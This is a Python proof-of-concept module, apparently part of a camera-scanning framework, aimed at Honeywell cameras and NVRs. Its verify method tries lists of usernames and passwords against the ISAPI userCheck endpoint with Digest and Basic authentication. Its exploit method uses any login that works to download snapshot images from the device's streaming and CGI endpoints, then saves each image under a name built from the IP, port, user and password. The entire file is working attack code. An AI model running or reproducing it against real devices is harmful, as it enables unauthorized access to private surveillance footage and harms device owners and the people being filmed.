import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth

from loguru import logger

from .base import POCTemplate


class HoneywellWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['honeywell']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """Honeywell cameras/NVRs with default credentials"""

    def verify(self, ip, port=80):
        """Honeywell devices use ISAPI-style endpoints similar to Hikvision"""
        headers = self._get_headers()
        proxies = self._get_proxies()
        for user in self.config.users:
            for password in self.config.passwords:
                # Try Digest auth first (most common)
                for auth_cls in [HTTPDigestAuth, HTTPBasicAuth]:
                    try:
                        r = requests.get(
                            self._get_url(ip, port, '/ISAPI/Security/userCheck'),
                            auth=auth_cls(user, password),
                            headers=headers,
                            verify=False,
                            timeout=self.config.timeout,
                            proxies=proxies
                        )
                        if r.status_code == 200 and 'userCheck' in r.text:
                            return ip, str(port), self.product, str(user), str(password), self.name
                    except Exception as e:
                        logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        # Try ISAPI snapshot endpoint
        url = self._get_url(ip, port, '/Streaming/channels/101/picture')
        if self._snapshot(url, img_file_name, HTTPDigestAuth(user, password)):
            return 1
        # Fallback to CGI
        url = self._get_url(ip, port, '/cgi-bin/snapshot.cgi')
        return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))


POCTemplate.register_poc(HoneywellWeakPassword)
